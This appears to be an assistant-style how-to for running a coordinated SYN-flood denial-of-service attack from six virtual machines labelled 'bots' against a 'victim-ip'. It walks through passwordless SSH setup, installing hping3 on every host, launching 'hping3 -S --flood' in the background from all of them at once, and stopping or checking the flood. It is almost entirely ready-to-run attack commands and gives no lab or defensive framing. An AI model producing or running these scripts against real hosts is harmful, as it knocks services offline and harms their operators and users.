
---

1. **Generate SSH key on control VM (if not done):**

```bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N ""
```

2. **Copy SSH key to each VM (replace user and IPs):**

```bash
ssh-copy-id user@vm1-ip
ssh-copy-id user@vm2-ip
ssh-copy-id user@vm3-ip
ssh-copy-id user@vm4-ip
ssh-copy-id user@vm5-ip
ssh-copy-id user@vm6-ip
```

3. **Install hping3 on all VMs (run once per VM):**

```bash
ssh user@vm1-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm2-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm3-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm4-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm5-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm6-ip 'sudo apt-get update && sudo apt-get install -y hping3'
```

4. **Prepare a bash one-liner to start hping3 DoS simultaneously from control VM:**

Create a file `vms.txt` listing IPs of all bots:

```
vm1-ip
vm2-ip
vm3-ip
vm4-ip
vm5-ip
vm6-ip
```

5. **Run simultaneous DoS from all bots:**

```bash
target_ip="victim-ip"
for ip in $(cat vms.txt); do
  ssh user@$ip "nohup sudo hping3 -S --flood $target_ip > /dev/null 2>&1 &"
done
```

6. **To stop all attacks:**

```bash
for ip in $(cat vms.txt); do
  ssh user@$ip "sudo pkill hping3"
done
```

7. **Check if hping3 is running on bots:**

```bash
for ip in $(cat vms.txt); do
  ssh user@$ip "pgrep hping3 && echo 'Running on $ip' || echo 'Not running on $ip'"
done
```

8. **Optional: Handling Different Usernames per VM**

If the VMs use different usernames, listing only IP addresses in `vms.txt` is insufficient. Instead, each entry should include the username and IP address in the format:

```
user1@vm1-ip
user2@vm2-ip
user3@vm3-ip
user4@vm4-ip
user5@vm5-ip
user6@vm6-ip
```

This approach explicitly specifies the SSH login for each VM.

---

### Updated commands using `user@ip` entries in `vms.txt`

**Copy SSH keys to all VMs:**

```bash
while read -r user_host; do
  ssh-copy-id "$user_host"
done < vms.txt
```

---

**Install hping3 on all VMs:**

```bash
while read -r user_host; do
  ssh "$user_host" 'sudo apt-get update && sudo apt-get install -y hping3'
done < vms.txt
```

---

**Run simultaneous DoS attack from all bots:**

```bash
target_ip="victim-ip"
while read -r user_host; do
  ssh "$user_host" "nohup sudo hping3 -S --flood $target_ip > /dev/null 2>&1 &"
done < vms.txt
```

---

**Stop all attacks:**

```bash
while read -r user_host; do
  ssh "$user_host" "sudo pkill hping3"
done < vms.txt
```

---

**Check if hping3 is running on bots:**

```bash
while read -r user_host; do
  ssh "$user_host" "pgrep hping3 && echo 'Running on $user_host' || echo 'Not running on $user_host'"
done < vms.txt
```

---

### Notes

* Using `while read -r` ensures each line is read correctly, even if usernames or IP addresses contain special characters.
* Including usernames with IP addresses enables management of VMs with different login accounts without modifying the scripts.
* Ensure SSH keys are properly copied for each `user@ip` entry to enable passwordless access.

---
